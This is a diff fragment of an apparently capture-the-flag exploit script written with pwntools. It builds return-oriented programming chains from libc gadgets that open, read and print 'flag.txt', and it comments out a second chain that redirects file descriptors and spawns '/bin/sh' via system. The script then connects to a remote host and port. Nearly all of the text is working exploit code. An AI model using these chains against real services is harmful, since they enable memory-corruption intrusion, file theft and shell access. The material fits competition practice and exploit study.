@@ -62,12 +62,10 @@ pl = p64(pop_rdi) + p64(libc.bss(0x200)) + p64(pop_rdx_r12) + p64(u64("flag.txt"
     p64(libc.sym.open) + p64(xchg_edi_eax) + p64(pop_rsi) + p64(libc.bss(0x200)) + p64(pop_rdx_r12) + p64(0x30) + p64(0) + \
     p64(libc.sym.read) + p64(mov_rax_rdi) + p64(sub_rax_1) + p64(xchg_edi_eax) + p64(pop_rsi) + p64(libc.bss(0x200)) + p64(libc.sym.write)
 
-pl = p64(pop_rdi) + p64(libc.bss(0x200)) + p64(pop_rdx_r12) + p64(u64("flag.txt")) + p64(0) + p64(mov_rdi_rdx) + p64(pop_rsi) + p64(0) + \
-    p64(libc.sym.open) + p64(sub_rax_1) + p64(xchg_esi_eax)  + p64(pop_rdi) + p64(0) + p64(libc.sym.dup2) + \
-    p64(pop_rdi) + p64(1) + p64(libc.sym.dup2) + p64(pop_rdi) + p64(2) + p64(libc.sym.dup2) + \
-    p64(pop_rdi) + p64(libc.bss(0x300)) + p64(pop_rdx_r12) + p64(u64("/bin/sh\0")) + p64(0) + p64(mov_rdi_rdx) + p64(pop_rdi+1) + p64(libc.sym.system)
-
-
+#pl = p64(pop_rdi) + p64(libc.bss(0x200)) + p64(pop_rdx_r12) + p64(u64("flag.txt")) + p64(0) + p64(mov_rdi_rdx) + p64(pop_rsi) + p64(0) + \
+ #   p64(libc.sym.open) + p64(sub_rax_1) + p64(xchg_esi_eax)  + p64(pop_rdi) + p64(0) + p64(libc.sym.dup2) + \
+#  p64(pop_rdi) + p64(1) + p64(libc.sym.dup2) + p64(pop_rdi) + p64(2) + p64(libc.sym.dup2) + \
+#    p64(pop_rdi) + p64(libc.bss(0x300)) + p64(pop_rdx_r12) + p64(u64("/bin/sh\0")) + p64(0) + p64(mov_rdi_rdx) + p64(pop_rdi+1) + p64(libc.sym.system)
 
 io2 = remote(HOST, PORT)
 
